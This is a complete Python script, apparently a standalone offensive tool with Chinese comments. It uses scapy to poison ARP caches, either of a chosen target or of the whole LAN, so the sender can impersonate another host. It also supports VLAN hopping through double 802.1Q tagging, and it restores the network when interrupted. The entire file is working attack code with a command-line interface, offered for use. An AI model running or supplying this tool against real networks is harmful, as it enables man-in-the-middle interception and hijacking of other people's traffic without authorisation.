#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Dot1Q,
    Ether,
    sendp
)
from scapy.interfaces import get_working_if
import argparse
import os
import sys
import time

mac_broad = 'ff:ff:ff:ff:ff:ff'


def arp_spoof(iface, target, host, vlan_own=False, vlan_target=False):
    # target 目标机ip
    # host   伪装的ip

    mac_self = get_if_hwaddr(iface)  # 获取自身mac地址

    if target:
        mac_target = getmacbyip(target)  # 获取目标机mac

        if not mac_target:
            print('[-]Error: Could not resole targets MAC address')
            sys.exit(1)

        ethernet = Ether(src=mac_self, dst=mac_target)
        arp = ARP(hwsrc=mac_self, psrc=host,
                  hwdst=mac_target, pdst=target, op=1)
        print('[+]Poisoning --> ', target, end=' ')
    else:
        ethernet = Ether(src=mac_self, dst=mac_broad)
        arp = ARP(hwsrc=mac_self, psrc=host, op=1)
        print('[+]Poisoning --> LAN', end='')

    # 判断是否加入Vlan标识
    if vlan_target:
        vlan_tag = Dot1Q(vlan=vlan_own) / Dot1Q(vlan_target)
        pkt = ethernet / vlan_tag / arp
    else:
        pkt = ethernet / arp

    print(" ('Ctrl + C' stop)")

    try:
        while True:
            sendp(pkt, iface=iface, verbose=False)
    except KeyboardInterrupt:
        print('\n[+]Stopped poison')
        arp_recover(iface, host)

# 发送正常的arp包
def arp_recover(iface, host):

    time.sleep(1)

    print('[*]Recovering the network')

    mac_host = getmacbyip(host)
    pkt = Ether(src=mac_host, dst=mac_broad) / \
        ARP(hwsrc=mac_host, psrc=host, op=1)
    sendp(pkt, iface=iface, inter=1, count=2, verbose=False)  # inter 发包间隔

    time.sleep(1)

    print('[+]Complete')

def main():

    if os.geteuid() != 0:
        print('[-]Need root user to run')
        sys.exit(1)

    usage = 'usage: arp_spoof.py [-h] [-i IFACE] [-t TARGET] [-vl vlan_own vlan_target] host'
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument('-i', '--iface', default='eth0',
                        help='The network interface of use')
    parser.add_argument(
        '-t', '--target', help='Specify a target to ARP poison')
    parser.add_argument('-vl', '--vlan', nargs=2,
                        help='The vlan hopping of use (eg:-vl 1 2)')
    parser.add_argument('host', help='host of impersonate')

    try:
        args = parser.parse_args()
        iface, target, vlan, host = args.iface, args.target, args.vlan, args.host

        if vlan:
            arp_spoof(iface, target, host,
                      vlan_own=vlan[0], vlan_target=vlan[1],)
        else:
            arp_spoof(iface, target, host)
    except ValueError:  # 捕获输入参数错误
        parser.print_help()


if __name__ == '__main__':
    main()
